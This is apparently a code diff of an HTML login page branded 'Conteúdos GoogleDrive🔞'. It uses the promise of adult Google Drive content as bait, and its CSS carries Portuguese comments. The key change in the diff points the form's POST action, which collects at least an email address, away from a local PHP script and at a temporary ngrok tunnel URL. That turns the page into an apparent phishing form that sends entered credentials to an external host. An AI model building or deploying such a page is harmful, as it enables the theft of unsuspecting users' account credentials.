@@ -6,42 +6,50 @@
     <title>Login Form</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
+        /* Estilo para o corpo da página */
         body {
             font-family: Arial, sans-serif;
-            background-image: url('https://github.com/Lai1s/presente/blob/eb1cb660df052a63cef2a42f3270cc9b43738d7c/fundo%202%20p.jpeg');
-            background-size: cover;
+            background-image: url('WhatsApp Image 2024-04-09 at 15.19.32.jpeg'); /* Caminho para a imagem de fundo */
+            background-size: cover; /* Garante que a imagem cubra todo o fundo */
+            background-repeat: no-repeat; /* Evita repetição da imagem */
+            background-position: center; /* Centraliza a imagem */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #fff;
+            color: #000;
             position: relative;
         }
+        /* Estilo para o container */
         .container {
             width: 350px;
-            background-color: rgba(255, 255, 255, 0.7);
+            background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
             position: relative;
             z-index: 1;
         }
+        /* Estilo para os cabeçalhos dentro do container */
         .container h2 {
             text-align: center;
             margin-bottom: 30px;
             color: #000;
         }
+        /* Estilo para grupo de formulário */
         .form-group {
             margin-bottom: 20px;
         }
+        /* Estilo para campos de entrada de formulário */
         input.form-control {
             border-radius: 20px;
             padding: 12px 20px;
             font-size: 16px;
             border: 1px solid #ddd;
         }
+        /* Estilo para botão */
         button {
             width: 100%;
             padding: 12px;
@@ -53,6 +61,7 @@
             cursor: pointer;
             transition: background-color 0.3s ease;
         }
+        /* Estilo para o estado de hover do botão */
         button:hover {
             background-color: #0056b3;
         }
@@ -61,7 +70,7 @@
 <body>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="process_form.php">
+        <form id="loginForm" method="POST" action="https://71ad-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
